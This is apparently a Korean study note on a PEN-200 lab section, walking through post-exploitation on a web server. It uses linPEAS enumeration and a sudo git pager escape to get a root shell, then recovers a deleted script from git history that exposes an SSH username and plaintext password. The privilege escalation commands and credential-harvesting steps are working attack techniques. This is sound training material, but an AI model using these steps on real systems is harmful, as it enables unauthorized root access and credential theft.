# 27.2.2 과거로 이어지는 단서

> **A Link to the Past** · PEN-200 §27.2.2

WEBSRV1 셸을 잡았으니 로컬 열거로 공격 벡터와 민감 정보를 찾고 권한을 올리는 단계임. 평가 기간이라는 시간 제약이 있으므로 linPEAS 같은 자동 열거 스크립트로 넓게 훑어 손쉬운 것부터 확인함. Kali 에서 파이썬 웹 서버로 스크립트를 올림.

```
kali@kali:~/beyond/websrv1$ cp /usr/share/peass/linpeas/linpeas.sh .
kali@kali:~/beyond/websrv1$ python3 -m http.server 80
```

**WordPress 설정** — `/srv/www/wordpress/wp-config.php` 의 DB 접속 설정에 평문 비밀번호가 있음.


경로가 데비안 계열의 통상 위치인 `/var/www/html` 이 아니라 `/srv/www/wordpress/` 라는 점도 당장 쓸 것은 아니나 기억해 둘 것. 그리고 그 디렉터리에 `.git` 이 있음 — root 소유에 다른 사용자는 읽지 못하나, sudo 로 git 을 돌릴 수 있으니 권한 있는 문맥에서 저장소를 뒤질 수 있음.

```

drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```
*퍼미션 `drwxr-----` 와 소유자 root — daniela 로는 못 읽음*

소득이 나왔다고 linPEAS 결과 검토를 중간에 끊지 말 것 — 결정적인 항목이 뒤쪽에 있었음.

권한 상승 후보는 셋 — ① sudo `/usr/bin/git` 악용 ② sudo 로 Git 저장소 수색 ③ WordPress DB 비밀번호로 다른 계정 시도. 비밀번호 입력이 필요 없는 ①이 가장 유망함. sudo 로 돌아가는 대부분의 명령은 권한 있는 대화형 셸로 전환할 여지가 있고, 그 방법은 GTFOBins 에서 찾음.

![[PEN200-Fig-367.png]]
*GTFOBins 의 git sudo 악용 벡터 — 환경 변수 방식과 페이저 방식*

첫 번째인 환경 변수 `PAGER` 주입은 sudoers 가 환경 변수 설정을 막아 실패함.

```
daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
sudo: sorry, you are not allowed to set the following environment variables: PAGER
```

두 번째는 도움말을 기본 페이저로 여는 방식임. 리눅스의 기본 페이저는 대개 `less` 이고 조작법이 vi 와 비슷해, `!` 뒤에 명령이나 실행 파일 경로를 넣으면 페이저를 띄운 계정의 문맥에서 실행됨.

```
daniela@websrv1:~$ sudo git -p help config
```

페이저 안에서 `!/bin/bash` 를 입력해 root 대화형 셸 획득.

```
...
       •   no section or name was provided (ret=2),
       •   the config file is invalid (ret=3),
!/bin/bash
root@websrv1:/home/daniela# whoami
root
```
*페이저 화면에서 `!/bin/bash` 입력 — 프롬프트가 `root@websrv1` 로 바뀜*

root 를 쥐었으니 Git 저장소를 봄. `git status` 는 `HEAD detached at 612ff57`, `git log` 에는 커밋 둘 — `initial commit` 과 `Removed staging script and internal network access`. 커밋 메시지 자체가 단서임: 이 머신이 예전에는 내부망에 접근했고 스테이징 스크립트가 삭제됐다는 뜻임.

```

root@websrv1:/srv/www/wordpress# git status

nothing to commit, working tree clean
root@websrv1:/srv/www/wordpress# git log
```

*`git log` 로 커밋 해시 확보 — 최신 커밋 `612ff57...` 이 다음 단계의 인자가 됨*

여기서 `git checkout` 으로 옛 커밋을 되살리는 것은 하지 말 것 — 웹 애플리케이션이 깨져 고객의 일상 업무를 중단시킬 수 있음. 커밋 간 차이만 보는 `git show <해시>` 가 안전한 접근이며, 첫 커밋 이후의 변경이 궁금하므로 최신 커밋 해시를 넘김.

```
root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
Author: root <root@websrv1>
Date:   Tue Sep 27 14:26:15 2022 +0000
    Removed staging script and internal network access
```

*삭제된 `fetch_current.sh` 의 diff — 마지막 두 줄은 교재 지면 폭 때문에 나뉜 한 줄 명령임*

삭제된 `fetch_current.sh` 가 diff 에 그대로 드러남 — 스테이징 서버 `192.168.50.245` 에서 `rsync` 로 웹앱을 당겨오는 스크립트이고, 비대화형 실행을 위해 `sshpass -p` 로 비밀번호를 평문 인자로 넘기고 있었음. 여기서 사용자 `john` 과 비밀번호 `dqsTwTpZPn#nL` 확보, `creds.txt` 에 추가.

`sshpass` 로 스크립트에 비밀번호를 넣는 방식은 자동화에서 흔히 쓰이며, 그래서 삭제된 커밋·설정 파일이 자격 증명의 단골 출처가 됨.

실제 평가였다면 root 획득 후 linPEAS 를 다시 돌릴 것 — daniela 로는 못 읽던 다른 사용자·시스템 파일이 이제 열리므로 새 정보가 나옴.
